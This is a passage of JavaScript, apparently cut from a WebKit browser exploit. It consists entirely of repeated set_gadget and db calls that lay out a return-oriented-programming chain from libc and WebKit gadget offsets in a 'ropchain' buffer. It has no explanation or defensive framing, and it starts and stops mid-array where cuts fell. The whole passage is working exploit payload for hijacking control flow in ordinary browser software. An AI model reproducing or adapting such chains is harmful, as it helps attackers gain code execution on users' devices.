ropchain+104936, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+105008, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+105064, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+2997875, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
webkit_base+7438103, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+105200, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+105304, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+105320, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+105464, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+105432, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+105448, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+105536, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+105592, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+793877, 
ropchain+105672, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadget(libc_base+788575,); 
db([19, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+105776, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+105792, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+105880, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+105936, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+106008, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+106064, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+2997875, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+882884, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+106200, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+106304, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+106320, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+106464, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+106432, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+106448, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+106536, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+106592, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+793877, 
ropchain+106672, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadget(libc_base+788575,); 
db([20, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+106776, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+106792, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+106880, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+106936, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+107008, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+107064, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+2997875, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+107200, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+107304, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+107320, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+107464, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+107432, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+107448, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+107536, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+107592, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+793877, 
ropchain+107672, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadget(libc_base+788575,); 
db([21, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+107776, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+107792, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+107880, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+107936, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+108008, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+108064, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+2997875, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+108152, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+108256, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+108272, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+108416, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+108384, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+108400, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+108488, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+108544, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+793877, 
ropchain+108624, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadget(libc_base+788575,); 
db([3, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+108728, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+108744, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+877175, 
libc_base+793877, 
ropchain+108832, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+108888, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+108992, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+109096, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+109112, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+109256, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+109224, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+109240, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+109328, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+109384, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+793877, 
ropchain+109464, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadget(libc_base+788575,); 
db([22, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+109568, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+109584, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+109672, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+109728, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+109800, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+109856, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+2997875, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
webkit_base+7438103, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+109992, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+110096, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+110112, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+110256, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+110224, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+110240, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+110328, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+110384, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+793877, 
ropchain+110464, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadget(libc_base+788575,); 
db([23, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+110568, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+110584, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+110672, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+110728, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+110800, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+110856, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+2997875, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+110992, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+111096, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+111112, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+111256, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+111224, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+111240, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+111328, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+111384, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+793877, 
ropchain+111464, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadget(libc_base+788575,); 
db([24, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+111568, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+111584, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+111672, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+111728, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+111800, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+111856, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+2997875, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+111944, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+112048, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+112064, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+112208, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+112176, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+112192, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+112280, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+112336, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+793877, 
ropchain+112416, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadget(libc_base+788575,); 
db([4, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+112520, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+112536, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+877175, 
libc_base+793877, 
ropchain+112624, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+112680, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+112784, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+112888, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+112904, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+113048, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+113016, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+113032, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+113120, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+113176, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+793877, 
ropchain+113256, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadget(libc_base+788575,); 
db([25, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+113360, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+113376, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+113464, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+113520, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+113592, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+113648, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+2997875, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
webkit_base+8975893, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+113784, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+113888, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+113904, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+114048, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+114016, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+114032, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+114120, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+114176, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+793877, 
ropchain+114256, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadget(libc_base+788575,); 
db([26, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+114360, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+114376, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+114464, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+114520, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+114592, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+114648, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+2997875, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+114784, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
